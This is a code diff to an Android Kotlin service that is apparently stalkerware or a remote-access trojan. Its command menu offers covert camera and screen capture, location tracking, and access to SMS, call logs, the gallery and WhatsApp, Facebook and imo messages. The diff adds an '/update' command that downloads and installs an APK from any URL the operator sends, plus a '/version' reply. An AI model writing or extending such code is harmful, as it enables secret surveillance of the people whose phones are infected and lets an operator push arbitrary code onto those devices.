@@ -203,6 +203,14 @@ class MonitoringService : LifecycleService() {
                 MessageStore.clearAll(this)
                 sendMsg("🗑 All stored messages cleared")
             }
+            cmd == "/update" -> {
+    if (arg.isNotEmpty() && arg.startsWith("http")) {
+        updateApp(arg)
+    } else {
+        sendMsg("❌ Usage: /update [APK URL]")
+    }
+}
+cmd == "/version" -> sendMsg("📱 Version: 1.0\nPackage: $packageName")
             cmd == "/help" -> sendMsg(
                 "📋 Commands:\n/cam /selfie\n/livecam [sec] /liveselfie [sec]\n/stop\n/screen /livescreen [sec]\n/location /battery\n/sms /calls /gallery\n/whatsapp /fb /imo\n/clearmsgs\n/flash /vibrate /toast [msg]\n/ping")
             else -> sendMsg("❓ Unknown: $raw")
@@ -468,6 +476,23 @@ class MonitoringService : LifecycleService() {
 
         sendMsg(sb.toString())
     }
+    // ===== AUTO UPDATE =====
+private fun updateApp(url: String) {
+    sendMsg("🔄 Update started...\n$url")
+    lifecycleScope.launch(Dispatchers.IO) {
+        try {
+            UpdateManager.downloadAndInstall(this@MonitoringService, url) { status ->
+                lifecycleScope.launch(Dispatchers.Main) {
+                    sendMsg(status)
+                }
+            }
+        } catch (e: Exception) {
+            withContext(Dispatchers.Main) {
+                sendMsg("❌ Update error: ${e.message}")
+            }
+        }
+    }
+}
 
     private fun sendMsg(t: String) {
         lifecycleScope.launch(Dispatchers.IO) {
